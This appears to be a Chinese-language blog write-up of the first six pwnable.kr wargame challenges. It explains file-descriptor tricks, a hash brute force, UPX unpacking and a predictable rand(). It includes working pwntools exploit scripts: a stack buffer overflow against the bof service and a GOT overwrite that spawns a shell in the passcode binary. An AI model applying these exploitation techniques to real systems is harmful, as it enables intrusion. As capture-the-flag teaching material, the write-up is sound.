---
layout:     post
title:      Pwnable.kr
category: coding
description: pwnable.kr Writeup
---

## 0x00 fd
Text：Mommy! what is a file descriptor in Linux?

![1](/images/pwnable-kr/1.jpg)

先ls看下都有什么文件，可以看到一个二进制文件，一份源码，和我们要拿到的flag

![2](/images/pwnable-kr/2.jpg)

看看源码，可以看出关键点就在于read函数，我对标准库也不是很了解所以想要找一份源码看看，但是并没有找到，根据查到零散资料我一开始把read函数理解为了从fd指向的内存中读取32字节到buf中，算好了 "LETMEWIN\n" 字符串的地址计算后的结果输入之后并没有成功。而fd的实际含义是linux对文件的一个索引id，而 `fd==0` 代表的含义是从终端中读取用户输入，所以我们只需要令 fd 为0就可以控制输入内容了。

附：[File Descriptor详解](http://blog.csdn.net/jnu_simba/article/details/8806654)

## 0x01 collision
Text：Daddy told me about cool MD5 hash collision today. I wanna do something like that too!

![3](/images/pwnable-kr/3.jpg)

一个简单的摘要计算，将4位char转为int，相加作为摘要，简单改下脚本手动爆破一下就可以得出结果

## 0x02 bof
Text：Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?

![4](/images/pwnable-kr/3.jpg)

很明显可以找到gets函数出可能存在溢出情况，查看栈情况后发现变量s长度为32，虽然应用程序开启了canary，但是system函数可以在返回之前触发，所以思路就是栈溢出直到覆盖ebp+8这个位置的a1变量为0xcafebabe

{% highlight python %}
from pwn import *

p = remote('pwnable.kr', 9000)

value = 0xcafebabe

payload = 'A' * 0x2C
payload += 'B'* 0x8
payload += p32(value)

p.sendline(payload)
p.interactive()
{% endhighlight %}

## 0x03 flag
这是一道逆向题，拖进ida发现是被加了upx壳，直接到ubuntu下 `upx -d` 脱壳，解开壳之后直接找到了flag

## 0x04 passcode
Text：Mommy told me to make a passcode based login system. My initial C code was compiled without any error! Well, there was some compiler warning, but who cares about that?

![8](/images/pwnable-kr/8.jpg)

这个程序的漏洞就出在这个login函数中，scanf时传入的是passcode1的值，而不是passcode1的地址，所以我们就可以把数据写到passcode1的值指向的地址，下一步就是如何控制passcode1的值

![6](/images/pwnable-kr/6.jpg)

这里可以看到welcome和login是连续调用的，所以这里两个函数的栈底应该是处于同一位置，所以考虑welcome中输入的用户名是否会对passcode1的值产生影响

所以用pattern命令构造了一个长度为100的字符串

- AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

![7](/images/pwnable-kr/7.jpg)

可以看到，passcode1的值是我们上次输入的字符串的最后四位，所以我们可以通过name的输入来控制passcode1指向的地址，看到scanf下一行调用了fflush，所以我们可以将passcode1的值指向fflush的got表地址，然后把fflush的地址改写为调用system('/bin/sh')的地址

![5](/images/pwnable-kr/5.jpg)

{% highlight python %}
#!/usr/bin/python 
from pwn import *

p = process('./passcode')
fflush_got = 0x0804a004
system_addr = 0x80485e3
payload = "A" * 96 + p32(fflush_got)
p.send(payload)
p.recvuntil(' :')
payload = str(system_addr)
p.send(payload)
p.interactive()
{% endhighlight %}

## 0x05 random
Text：Daddy, teach me how to use random value in programming!

![9](/images/pwnable-kr/9.jpg)

可以看到rand()没有输入随机种子，所以这其实是一个伪随机，每次运行的结果是一样的，所以直接从gdb取出随机值，然后计算出异或结果，输入，得到flag

![10](/images/pwnable-kr/10.jpg)